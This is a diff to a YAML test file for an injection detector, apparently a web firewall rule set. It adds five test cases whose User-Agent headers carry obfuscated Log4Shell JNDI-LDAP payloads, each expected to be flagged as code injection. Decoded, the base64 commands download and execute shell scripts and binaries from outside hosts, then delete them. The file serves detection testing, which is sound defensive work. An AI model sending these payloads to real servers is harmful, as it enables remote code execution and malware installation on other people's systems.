@@ -423,3 +423,29 @@ config:
     input:
       User-Agent                           : '${${mKWS:vLQGie:-j}${kw:Q:siXjQ:PNJ:-n}${WT:WftMBd:-d}${iC:SGph:GJlDQA:eweoE:-i}${NK:sP:bKklV:IqJB:-:}${K:IzHzM:fCS:p:fahEU:-l}${zL:t:AjHnk:-d}${HDAAM:i:XtnHg:-a}${nXb:V:poqpf:WpEh:-p}${YxVTbn:D:xQMeG:DJpNK:EyTp:-:}'
     expected: *isCodeInjection
+
+- test:
+    input:
+      User-Agent                           : 't(''${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//139.59.35.166:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzE5OS4xOTUuMjUzLjE4Ny9ha3R1YWxpc2llcmVuLnNoIC1vIGFrdHVhbGlzaWVyZW4uc2g7IHdnZXQgaHR0cDovLzE5OS4xOTUuMjUzLjE4Ny9ha3R1YWxpc2llcmVuLnNoOyBjaG1vZCA3NzcgYWt0dWFsaXNpZXJlbi5zaDsgc2ggYWt0dWFsaXNpZXJlbi5zaDsgcm0gLXJmIGFrdHVhbGlzaWVyZW4uc2g7IHJtIC1yZiBha3R1YWxpc2llcmVuLnNoLjE=}'')'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      User-Agent                           : 't(''${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//142.93.124.89:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzEzNS4xNDguNTguMjMxOjE5ODAvYWt0dWFsaXNpZXJlbi5zaCAtbyBha3R1YWxpc2llcmVuLnNoOyB3Z2V0IGh0dHA6Ly8xMzUuMTQ4LjU4LjIzMToxOTgwL2FrdHVhbGlzaWVyZW4uc2g7IGNobW9kIDc3NyBha3R1YWxpc2llcmVuLnNoOyBzaCBha3R1YWxpc2llcmVuLnNoOyBybSAtcmYgYWt0dWFsaXNpZXJlbi5zaDsgcm0gLXJmIGFrdHVhbGlzaWVyZW4uc2guMQ==}'')'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      User-Agent                           : 't(''${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//159.223.224.249:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzEzNS4xNDguNTguMjMxOjE5ODAvbWVpbmVfQWt0ZW4vS29iYWx0Lng4NjsgY3VybCAtTyBodHRwOi8vMTM1LjE0OC41OC4yMzE6MTk4MC9tZWluZV9Ba3Rlbi9Lb2JhbHQueDg2O2NhdCBLb2JhbHQueDg2ID53eWtvbnl3YWxueTtjaG1vZCAreCAqOy4vd3lrb255d2FsbnkgS29iYWx0Lng4Ng==}'')'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      User-Agent                           : 't(''${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3Jpb3Qvb3BlbnZwbjsgY3VybCAtTyBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3Jpb3Qvb3BlbnZwbjsgY2htb2QgNzc3IG9wZW52cG47IC4vb3BlbnZwbiBydW5uZXI=}'')'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      User-Agent                           : 't(''${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//204.48.22.99:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS41MS4xNzAvOFVzQS5zaDsgY3VybCAtTyBodHRwOi8vMjA5LjE0MS41MS4xNzAvOFVzQS5zaDsgY2htb2QgNzc3IDhVc0Euc2g7IHNoIDhVc0Euc2g7IHJtIC1yZiA4VXNBLnNo}'')'
+    expected: *isCodeInjection
+
